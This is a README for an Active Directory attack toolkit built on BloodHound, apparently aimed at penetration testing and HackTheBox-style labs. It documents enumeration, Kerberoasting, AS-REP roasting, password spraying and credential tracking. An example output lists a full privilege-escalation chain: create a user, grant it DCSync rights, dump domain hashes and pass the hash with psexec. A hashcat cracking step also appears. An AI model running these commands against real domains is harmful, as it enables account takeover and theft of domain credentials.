# BloodTrail

Active Directory attack path discovery and exploitation toolkit. Extends BloodHound with pre-auth enumeration, credential pipelines, and automated command generation.

## Features

| Feature | Description |
|---------|-------------|
| Pre-Auth Enumeration | AS-REP roasting, Kerberoasting, password policy discovery |
| Credential Pipeline | Validate → Collect → Import → Mark Pwned → Query |
| Edge Enhancement | Import missing edges from SharpHound exports |
| Query Library | 63+ Cypher queries for attack path discovery |
| Pwned Tracking | Track compromised users and access paths in Neo4j |
| Command Generation | Auto-suggest exploitation commands for discovered paths |
| **Attack Chain Detection** | Auto-detect multi-step escalation paths (Exchange DCSync, GenericAll, etc.) |
| Password Spraying | Policy-aware spraying with lockout protection |

## Installation

```bash
pip install bloodtrail
# With auto-collection support (bloodhound-python)
pip install bloodtrail[collect]
# From source
pip install -e .
```

### Docker (includes Neo4j + bloodhound-python)

```bash
docker compose up -d
# Import SharpHound data (mount to ./data/)
docker compose exec bloodtrail bloodtrail /data/sharphound.zip --uri bolt://neo4j:7687
# Run queries
docker compose exec bloodtrail bloodtrail --run-all --uri bolt://neo4j:7687
```

Neo4j UI available at `http://localhost:7474` (neo4j/bloodtrail).

## Quick Start

```bash
# Anonymous enumeration
bloodtrail 10.10.10.161

# With credentials (auto-validates, collects BloodHound, marks pwned)
bloodtrail 10.10.10.161 --creds svc-alfresco:s3rvice

# Import existing SharpHound data
bloodtrail /path/to/sharphound.zip

# Resume with existing Neo4j data
bloodtrail -r

# Mark user pwned and view attack paths
bloodtrail --pwn 'USER@DOMAIN.COM' --cred-type password --cred-value 'secret'

# Also works as module
python -m bloodtrail --help
```

## Command Reference

### Enumeration (Pre-Auth)

```bash
bloodtrail <IP>                        # Anonymous enumeration
bloodtrail <IP> -u user -p pass        # Authenticated
bloodtrail <IP> --domain corp.local    # Specify domain
bloodtrail --list-enumerators          # Show available tools
```

Discovers: AS-REP roastable users, Kerberoastable SPNs, password policy, domain users/groups.

### Credential Pipeline

```bash
bloodtrail <IP> --creds user:pass              # Inline
bloodtrail <IP> --creds 'DOMAIN/user:pass'     # With domain
bloodtrail <IP> --creds-file ./creds.txt       # From file
bloodtrail <IP> --use-potfile                  # From hashcat potfile
bloodtrail <IP> --creds 'user:<NTLM_HASH>'     # NTLM hash (auto-detected)
```

Pipeline: `Parse → Validate → Collect → Import → Mark Pwned → Query`

| Flag | Effect |
|------|--------|
| `--skip-validate` | Skip credential validation |
| `--no-collect` | Skip BloodHound collection |
| `--no-pwn` | Skip marking users as pwned |

### BloodHound Import

```bash
bloodtrail /path/to/sharphound.zip     # Import ZIP
bloodtrail /path/to/bh_data/           # Import directory
bloodtrail /path --preset attack-paths # High-value edges only
bloodtrail /path --validate            # Validate without import
bloodtrail --list-edges                # Show supported edge types
```

### Query Library

```bash
bloodtrail --list-queries              # List all 63+ queries
bloodtrail --search-query kerberos     # Search by keyword
bloodtrail --run-query find-asrep      # Execute single query
bloodtrail --run-all                   # Run all, generate report
bloodtrail --install-queries           # Install to BloodHound GUI
```

### Attack Chain Detection

BloodTrail automatically detects multi-step privilege escalation paths from BloodHound data and generates ready-to-run commands.

```bash
# Detect chains for a specific user
bloodtrail --chains svc-alfresco -d htb.local --dc-ip 10.10.10.161

# Chains are also included in the full report
bloodtrail --run-all
```

**Detected Chain Types:**

| Chain | Description |
|-------|-------------|
| Exchange WriteDACL → DCSync | Account Operators → Exchange Windows Permissions → DCSync |
| GenericAll → Password Reset | Reset user password via GenericAll privilege |
| ForceChangePassword | Change password without knowing current |
| Backup Operators → NTDS.dit | Extract hashes via backup privilege |

**Example Output:**
```
[DETECTED] Exchange WriteDACL → DCSync
  1. net user bloodtrail 'B1oodTr@il123!' /add /domain
  2. net group "Exchange Windows Permissions" bloodtrail /add
  3. Add-ObjectACL -PrincipalIdentity bloodtrail -Rights DCSync
  4. impacket-secretsdump HTB.LOCAL/bloodtrail:'B1oodTr@il123!'@10.10.10.161
  5. impacket-psexec HTB.LOCAL/Administrator@10.10.10.161 -hashes <HASH>
```

### Pwned User Tracking

```bash
bloodtrail --pwn 'USER@DOMAIN.COM' --cred-type password --cred-value 'secret'
bloodtrail --pwn-interactive           # Interactive mode
bloodtrail --list-pwned                # List all pwned users
bloodtrail --pwned-user USER           # User details + commands
bloodtrail --unpwn USER                # Remove pwned status
bloodtrail --cred-targets              # Credential harvest targets
bloodtrail --post-exploit              # Post-exploitation commands
bloodtrail --recommend                 # Attack path recommendations
```

### Domain Configuration

```bash
bloodtrail --show-config               # Show stored config
bloodtrail --dc-ip 10.10.10.1          # Set DC IP
bloodtrail --domain-sid S-1-5-21-...   # Set domain SID
bloodtrail --lhost 10.10.14.5 --lport 443  # Callback config
bloodtrail --discover-dc user pass     # Auto-discover DC
bloodtrail --clear-config              # Clear config
bloodtrail --purge                     # Purge all Neo4j data
```

### Password Policy & Spraying

```bash
# Policy
bloodtrail --set-policy                # Import from 'net accounts'
bloodtrail --set-policy policy.txt     # From file
bloodtrail --show-policy               # Display policy
bloodtrail --clear-policy              # Clear policy

# Spraying
bloodtrail --spray                     # Spray recommendations
bloodtrail --spray-tailored            # BloodHound-based targeting
bloodtrail --auto-spray                # Generate spray scripts
bloodtrail --auto-spray --execute      # Execute with confirmation
```

## Neo4j Connection

Default: `bolt://localhost:7687`

```bash
# Environment variable (recommended)
export NEO4J_PASSWORD='your_password'
bloodtrail --run-all

# CLI override
bloodtrail --uri bolt://host:7687 --user neo4j --neo4j-password secret
```

Config file (`~/.crack/config.json`):
```json
{
  "bloodtrail": {
    "neo4j_uri": "bolt://localhost:7687",
    "neo4j_user": "neo4j",
    "neo4j_password": "your_password"
  }
}
```

## Example Workflow

```bash
# 1. Anonymous enumeration - find AS-REP roastable users
bloodtrail 10.10.10.161

# 2. AS-REP roast discovered user
impacket-GetNPUsers -dc-ip 10.10.10.161 -request -no-pass htb/svc-alfresco

# 3. Crack the hash
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt

# 4. Feed credentials back (validates, collects BloodHound, marks pwned)
bloodtrail 10.10.10.161 --creds svc-alfresco:s3rvice

# 5. View attack paths from pwned user
bloodtrail --pwned-user 'SVC-ALFRESCO@HTB.LOCAL'

# 6. Run full report with attack chain detection
bloodtrail --run-all --dc-ip 10.10.10.161
# Look for [DETECTED] chains in output

# 7. Or detect chains for specific user
bloodtrail --chains svc-alfresco -d htb.local --dc-ip 10.10.10.161
```

## Output Files

Generated in working directory or next to imported data:

| File | Contents |
|------|----------|
| `bloodtrail.md` | Full attack path report |
| `users_all.txt` | All discovered users |
| `users_real.txt` | Non-service accounts (spray targets) |
| `asrep_targets.txt` | AS-REP roastable users |
| `kerberoast_targets.txt` | Users with SPNs |
| `computers.txt` | Computer names |
| `domain_info.txt` | Domain summary |

## Architecture

```
bloodtrail/
├── cli/                      # Command-line interface
│   ├── base.py              # BaseCommandGroup ABC
│   ├── parser.py            # Argument parser
│   ├── interactive.py       # Interactive helpers
│   └── commands/            # Command handlers
│       ├── query.py         # --list-queries, --run-query, --run-all
│       ├── pwned.py         # --pwn, --list-pwned, --post-exploit
│       ├── config.py        # --dc-ip, --show-config, --purge
│       ├── policy.py        # --set-policy, --show-policy
│       ├── spray.py         # --spray, --auto-spray
│       ├── creds.py         # --creds, --use-potfile
│       ├── enumerate.py     # IP address mode
│       └── import_data.py   # Path/ZIP import mode
│
├── core/                     # Shared utilities
│   ├── models.py            # Query, QueryResult dataclasses
│   ├── formatters.py        # Display formatting
│   ├── neo4j_connection.py  # Connection management
│   └── query_loader.py      # JSON query loading
│
├── enumerators/              # Pre-auth enumeration plugins
│   ├── enum4linux.py        # SMB/RPC enumeration
│   ├── ldapsearch.py        # LDAP enumeration
│   ├── kerbrute.py          # Kerberos user enum
│   └── getnpusers.py        # AS-REP roasting
│
├── autospray/                # Password spray automation
│   ├── executor.py          # Spray execution
│   ├── lockout.py           # Lockout protection
│   └── sources.py           # Credential sources
│
├── display/                  # Output formatting
│   ├── tables.py            # Table rendering
│   ├── attack_paths.py      # Attack path display
│   └── post_exploit.py      # Post-exploitation commands
│
├── cypher_queries/           # Query library (JSON)
│   ├── quick_wins.json
│   ├── lateral_movement.json
│   ├── privilege_escalation.json
│   └── attack_chains.json
│
├── recommendation/           # Attack path analysis
│   ├── attack_chains.py     # Dynamic chain detection
│   ├── bloodhound_analyzer.py # BloodHound query analysis
│   ├── models.py            # Finding, Recommendation models
│   ├── triggers.py          # Pattern matching rules
│   └── engine.py            # Recommendation state machine
│
├── main.py                   # BHEnhancer core
├── query_runner.py           # Cypher execution
├── report_generator.py       # Report generation + chain detection
├── pwned_tracker.py          # Pwned user tracking
├── command_suggester.py      # Command generation
└── creds_pipeline.py         # Credential pipeline
```

## Testing

```bash
pip install -e ".[dev]"
pytest bloodtrail/tests/ -v
```

797 tests covering credential parsing, spray execution, query handling, and Neo4j integration.
